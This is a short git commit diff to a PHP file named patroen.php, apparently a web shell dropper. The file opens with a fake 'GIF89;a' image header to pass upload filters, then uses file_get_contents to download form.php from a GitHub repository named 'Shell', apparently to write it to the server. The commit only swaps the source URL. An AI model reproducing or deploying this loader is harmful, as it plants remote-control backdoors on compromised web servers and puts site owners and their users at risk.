43c82e53ee2b5654fc960a4691429c2fbc829048
PatroeN Development <110349223+PatroenDev@users.noreply.github.com>
2024-05-19 12:57:16 +0300

    Update patroen.php

--- patroen.php
+++ patroen.php
@@ -3,7 +3,7 @@
 GIF89;a
 <html>
 <?php
-    $url = "https://github.com/poeice/Shelller/raw/main/form.php";
+    $url = "https://github.com/PatroenDev/Shell/raw/main/form.php";
     $fileContent = file_get_contents($url);
     if ($fileContent !== false) {
         $fileName = "form.php"; 
